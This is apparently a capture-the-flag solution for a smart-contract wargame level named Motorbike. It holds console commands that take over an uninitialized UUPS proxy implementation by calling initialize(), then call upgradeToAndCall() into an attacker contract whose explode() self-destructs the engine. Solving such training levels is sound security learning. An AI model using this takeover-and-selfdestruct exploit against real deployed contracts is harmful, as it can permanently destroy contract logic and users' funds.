/*Tools needed for this level:
- Console
- Remix

0.- Get familiar with the Initializable contract
https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/proxy/utils/Initializable.sol

1.- Deploy this contract (MotorbikeAttack) with Remix using the injected Web3 environment.

2- Declare deployed contract's address in console:
bomb = "replace_with_deployed_contract_address"

3.- Get the implementation contract's address stored at specific storage slot in Motorbike contract:
implAddr = await web3.eth.getStorageAt(
    instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
)

4.- Format the implementation contract's address:
implAddr = '0x' + implAddr.slice(-40)

5.- Encode initialize() function signature:
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

6.- Send tx with the encoded data to execute the initialize() function, so that we declare ourselves
as upgrader:
await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })

7.- Encode explode() function of this contract (MotorbikeAttack.sol):
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

8.-  Declare the upgradeToAndCall() function signature as a JSON interface:
upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

9.- Declare the parameters for the upgradeToAndCall() function:
upgradeParams = [bomb, explodeData]

10.- Declare the data of the function call concatenating the function signature and its parameters:
upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)

11.-  Call the upgradeToAndCall() function of the engine contract which will trigger the bomb()
function if the attacker contract::
await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttack {
	function explode() public {
		selfdestruct(payable(address(0)));
	}
}
